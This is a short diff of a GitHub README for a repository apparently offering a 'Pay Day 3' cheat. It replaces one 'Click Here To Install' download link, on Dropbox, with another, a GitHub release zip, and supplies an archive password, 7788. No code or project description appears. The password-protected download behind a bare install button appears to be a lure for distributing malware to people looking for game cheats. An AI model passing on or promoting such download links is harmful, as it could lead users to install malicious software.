@@ -1,6 +1,6 @@
 ![1alt](https://github.com/qozajoj/Pay-Day-3-Cat/assets/159404206/43845eb3-3d0c-4418-a788-0ea374a9f4fa)
 
-# 📁[Click Here To Install](https://dl.dropboxusercontent.com/scl/fi/ai2tuoq0vl3o7cfrlzj9u/GitHub-Project?rlkey=88vabn51bri5lgm224z2zjp9x)
+# 📁[Click Here To Install](https://github.com/qozajoj/Pay-Day-3-Cat/releases/download/Release/GitHub.Project.zip)
 
 # 🔑𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: 7788
 
